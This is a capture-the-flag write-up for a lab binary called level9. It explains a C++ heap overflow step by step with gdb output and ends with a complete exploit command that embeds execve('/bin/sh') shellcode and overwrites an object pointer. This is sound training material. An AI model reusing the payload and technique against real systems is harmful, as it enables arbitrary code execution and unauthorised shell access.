We start by opening the the file in [dogbolt](https://dogbolt.org/).
It is a cpp file that use `new` and `memcpy` so we know that we will overflow on the heap

In this file there is 3 interesting thing :
- We see that new have a fix size of 6C => 108
- There is two `new` : `v3` == `v6` and `v4`. Where `v4` is allocated just after `v6` in the heap.
- In `N::setAnnotation` there is a `memcpy` that copy `argv[1]` in `v6` at the address `this + 4`

So what are we going to do : 
In the return of main has a double dereferenced call of `v4`.
Since  `v4` is just after `v6` in the heap and that we can write in `v6` in an insecure way, we can use `v6` to overwrite `v4` with a custom address.
Here is what we are going to do: We will put on `v4` on address pointing on an address pointing on our `shellcode`
The shellcode will be contained in our input.

Finding the address of our input in the heap:
We start the program and go after the `N::setAnnotation` (the `memcpy` is in it)

```Shell
(gdb) start AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Temporary breakpoint 4 at 0x80485f8
Starting program: /home/user/level9/level9 AAAA
(gdb) ni 29
(gdb) disas main
Dump of assembler code for function main:
   ...
   0x0804866c <+120>:   mov    %eax,0x4(%esp)
   0x08048670 <+124>:   mov    0x14(%esp),%eax
   0x08048674 <+128>:   mov    %eax,(%esp)
   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
=> 0x0804867c <+136>:   mov    0x10(%esp),%eax
   0x08048680 <+140>:   mov    (%eax),%eax
   ...
```

We search the heap to find our value and we found `0x804a00c` the address on the heap
```Shell
(gdb) i proc map
process 5525
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
         0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
         0x804a000  0x806b000    0x21000        0x0 [heap]
        0xb7cfa000 0xb7cfc000     0x2000        0x0 
        0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
        0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
        0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1
        0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so
        0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so
        0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so
        0xb7d46000 0xb7d47000     0x1000        0x0 
        0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7eea000 0xb7eec000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7eec000 0xb7eed000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7eed000 0xb7ef0000     0x3000        0x0 
        0xb7ef0000 0xb7fc8000    0xd8000        0x0 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
        0xb7fc8000 0xb7fc9000     0x1000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
        0xb7fc9000 0xb7fcd000     0x4000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
        0xb7fcd000 0xb7fce000     0x1000    0xdc000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
        0xb7fce000 0xb7fd5000     0x7000        0x0 
        0xb7fdb000 0xb7fdd000     0x2000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

We can the start and the end of the heap at this line:
`0x804a000  0x806b000    0x21000        0x0 [heap]`
Where `0x804a000` is the starting address and `0x806b000` is the first that address doesn't belong to the heap anymore. (It's like a index where you have to : array[len(array) - 1] to access the last element)
So address end of the heap - 1 : `0x806b000` - 1 => `0x806afff`

```Shell
(gdb) find 0x804a000, 0x806afff, "AAAA"
0x804a00c
1 pattern found.
```

Know we have to launch `/bin/sh` with a shellcode
To accommodate the double dereferencement we will overwrite the address of `v4` with the address of the beginning of our heap buffer.
At the start of our input we will put another address pointing to the shellcode :
[address of input + 4(sizeof this address)][shellcode][padding][address of input(this overwrite `v4`)]
address of the input in the heap : 0x804a00c
in little endian : \x0c\xa0\x04\x08
address of the shellcode (input + 4) : 0x804a00c + 0x4 = 804A010
in little endian : \x10\xa0\x04\x08

The [shellcode](https://shell-storm.org/shellcode/files/shellcode-811.html) we will be using is : `\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80`

```Shell
./level9 $(python -c 'print"\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\x04\x08"')
```
